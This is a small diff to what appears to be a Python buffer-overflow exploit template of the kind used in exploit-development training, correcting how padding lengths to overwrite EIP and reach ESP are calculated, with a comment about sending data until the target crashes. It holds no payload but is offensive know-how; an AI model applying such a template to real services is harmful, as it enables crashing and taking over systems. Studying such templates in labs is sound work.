@@ -13,7 +13,7 @@ size = [crash amount from #1 + extra ~400 characters]
 ## Enter in the msf-pattern_offset amount.
 filler_to_EIP = "A" * [input length outputed by msf-pattern_offset]
 EIP = "B" * 4
-filler_to_ESP = "C" * (size - len(filler_to_EIP + EIP))
+filler_to_ESP = "C" * (size - (len(filler_to_EIP) + len(EIP)))
 
 # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
 try:
